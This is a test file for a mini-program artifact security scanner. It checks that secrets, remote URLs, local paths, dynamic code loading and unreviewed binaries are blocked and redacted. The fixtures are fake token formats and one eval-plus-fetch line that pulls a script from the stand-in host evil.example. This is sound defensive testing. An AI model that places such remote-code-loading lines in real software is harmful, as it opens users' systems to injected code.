import { describe, expect, test } from 'bun:test'

import {
  MiniProgramArtifactSecurityError,
  assertMiniProgramCompilerOutputSafe,
  assertMiniProgramProjectArtifactSafe,
  assertMiniProgramWorkerDiagnosticSafe,
  safeMiniProgramWorkerErrorMessage
} from '@/app/plugins/host/miniprogram/artifact-security'

function securityError(operation: () => void): MiniProgramArtifactSecurityError {
  try {
    operation()
  } catch (cause) {
    if (cause instanceof MiniProgramArtifactSecurityError) return cause
    throw cause
  }
  throw new Error('Expected the mini-program artifact security scan to reject the input')
}

const PNG_SIGNATURE = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])

function binaryWithMetadata(signature: Uint8Array, metadata: string): Uint8Array {
  const encoded = new TextEncoder().encode(metadata)
  const bytes = new Uint8Array(signature.byteLength + encoded.byteLength)
  bytes.set(signature)
  bytes.set(encoded, signature.byteLength)
  return bytes
}

describe('mini-program source artifact security', () => {
  test('accepts reviewed local source, package specifiers, and root-relative mini-program assets', () => {
    expect(() =>
      assertMiniProgramCompilerOutputSafe({
        files: new Map<string, string | Uint8Array>([
          [
            'src/pages/home/index.tsx',
            "import { View } from '@tarojs/components'\nexport default () => <View />\n"
          ],
          ['src/pages/home/index.scss', "background-image: url('/assets/images/hero.png');\n"],
          ['assets/images/hero.png', new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10])]
        ]),
        warnings: [{ code: 'review-required', message: 'Review unsupported authored behavior.' }]
      })
    ).not.toThrow()
  })

  test('blocks known and generic provider secrets without echoing source or path', () => {
    const secret = `sk-proj-${'A'.repeat(24)}`
    const unsafePath = `src/${secret}.ts`
    const error = securityError(() =>
      assertMiniProgramProjectArtifactSafe(
        new Map([[unsafePath, `export const token = '${secret}'`]])
      )
    )

    expect(error.code).toBe('MINIPROGRAM_ARTIFACT_SECURITY')
    expect(error.diagnostic).toEqual({
      code: 'secret-detected',
      entryIndex: 0,
      source: 'file-path'
    })
    expect(error.message).not.toContain(secret)
    expect(JSON.stringify(error.diagnostic)).not.toContain(secret)

    for (const value of [
      `Authorization: Bearer ${'b'.repeat(32)}`,
      `const apiKey = 'AIza${'c'.repeat(35)}'`,
      `const token = 'glpat-${'d'.repeat(24)}'`,
      `const supabaseKey = 'sb_publishable_${'e'.repeat(24)}'`,
      `const jwt = '${'a'.repeat(12)}.${'b'.repeat(12)}.${'c'.repeat(12)}'`,
      `-----BEGIN PRIVATE KEY-----\n${'f'.repeat(32)}\n-----END PRIVATE KEY-----`
    ]) {
      expect(
        securityError(() =>
          assertMiniProgramProjectArtifactSafe(new Map([['src/config.ts', value]]))
        ).diagnostic.code
      ).toBe('secret-detected')
    }
  })

  test('blocks remote URLs, absolute local paths, and dynamic code loading', () => {
    const cases = [
      ['remote-url-detected', "const endpoint = 'https://api.example.invalid/v1'"],
      ['remote-url-detected', "const endpoint = '//cdn.example.invalid/runtime.js'"],
      ['absolute-local-path-detected', "const source = '/Users/example/private/file.ts'"],
      ['absolute-local-path-detected', String.raw`const source = 'C:\Users\example\file.ts'`],
      ['absolute-local-path-detected', "const source = 'file:///tmp/private.txt'"],
      ['dynamic-code-detected', "const module = import('./runtime')"],
      ['dynamic-code-detected', "const run = new Function('return 1')"],
      [
        'dynamic-code-detected',
        "const script = document.createElement('script'); script.src = path"
      ]
    ] as const

    for (const [code, source] of cases) {
      expect(
        securityError(() =>
          assertMiniProgramProjectArtifactSafe(new Map([['src/runtime.ts', source]]))
        ).diagnostic.code
      ).toBe(code)
    }
  })

  test('allows raster namespace URLs while scanning binary metadata for tokens and local paths', () => {
    const xmpNamespace = binaryWithMetadata(
      new Uint8Array([0xff, 0xd8, 0xff]),
      'XML:com.adobe.xmp\u0000http://ns.adobe.com/xap/1.0/'
    )
    expect(() =>
      assertMiniProgramProjectArtifactSafe(new Map([['assets/photo.jpg', xmpNamespace]]))
    ).not.toThrow()

    const binarySecret = binaryWithMetadata(
      PNG_SIGNATURE,
      `metadata token = 'a1B2c3D4e5F6g7H8i9J0k1L2'` // gitleaks:allow -- Deliberate fake token for the scanner regression.
    )
    const binaryError = securityError(() =>
      assertMiniProgramProjectArtifactSafe(new Map([['assets/image.png', binarySecret]]))
    )
    expect(binaryError.diagnostic).toEqual({
      code: 'secret-detected',
      entryIndex: 0,
      source: 'binary-metadata'
    })

    const localPath = '/Users/example/private/source.psd'
    const webpSignature = new Uint8Array([82, 73, 70, 70, 0, 0, 0, 0, 87, 69, 66, 80])
    const localPathError = securityError(() =>
      assertMiniProgramProjectArtifactSafe(
        new Map([
          ['assets/source.webp', binaryWithMetadata(webpSignature, `SourceFile=${localPath}`)]
        ])
      )
    )
    expect(localPathError.diagnostic).toEqual({
      code: 'absolute-local-path-detected',
      entryIndex: 0,
      source: 'binary-metadata'
    })
    expect(localPathError.message).not.toContain(localPath)
  })

  test('allows only reviewed raster binaries with matching signatures', () => {
    expect(() =>
      assertMiniProgramProjectArtifactSafe(
        new Map<string, Uint8Array>([
          ['assets/image.png', PNG_SIGNATURE],
          ['assets/image.jpeg', new Uint8Array([0xff, 0xd8, 0xff])],
          ['assets/image.gif', new TextEncoder().encode('GIF89a')],
          ['assets/image.webp', new Uint8Array([82, 73, 70, 70, 0, 0, 0, 0, 87, 69, 66, 80])]
        ])
      )
    ).not.toThrow()

    const executableBytes = new TextEncoder().encode(
      "eval('remote'); fetch('https://evil.example/runtime.js')"
    )
    expect(
      securityError(() =>
        assertMiniProgramProjectArtifactSafe(new Map([['src/runtime.js', executableBytes]]))
      ).diagnostic
    ).toEqual({
      code: 'unreviewed-binary-artifact',
      entryIndex: 0,
      source: 'binary-metadata'
    })
    expect(
      securityError(() =>
        assertMiniProgramProjectArtifactSafe(new Map([['assets/not-really.png', executableBytes]]))
      ).diagnostic.code
    ).toBe('unreviewed-binary-artifact')
  })

  test('scans compiler warning fields', () => {
    const warningError = securityError(() =>
      assertMiniProgramCompilerOutputSafe({
        files: new Map([['app.json', '{}\n']]),
        warnings: [
          {
            code: 'unsafe-warning',
            message: `credential: sk-proj-${'z'.repeat(24)}`
          }
        ]
      })
    )
    expect(warningError.diagnostic).toEqual({
      code: 'secret-detected',
      entryIndex: 0,
      source: 'compiler-warning'
    })
    expect(warningError.message).not.toContain('sk-proj-')
  })

  test('redacts unsafe Worker diagnostics and accepts bounded safe diagnostics', () => {
    const secret = `ghp_${'q'.repeat(24)}`
    expect(safeMiniProgramWorkerErrorMessage(`Compiler failed near ${secret}`)).toBe(
      'Mini-program compiler Worker blocked an unsafe diagnostic'
    )
    expect(safeMiniProgramWorkerErrorMessage('Compiler failed for an unsupported node')).toBe(
      'Compiler failed for an unsupported node'
    )
    const error = securityError(() =>
      assertMiniProgramWorkerDiagnosticSafe(`Failed to read /Users/example/private.ts`)
    )
    expect(error.diagnostic.source).toBe('worker-error')
    expect(error.message).not.toContain('/Users/example/private.ts')
  })
})
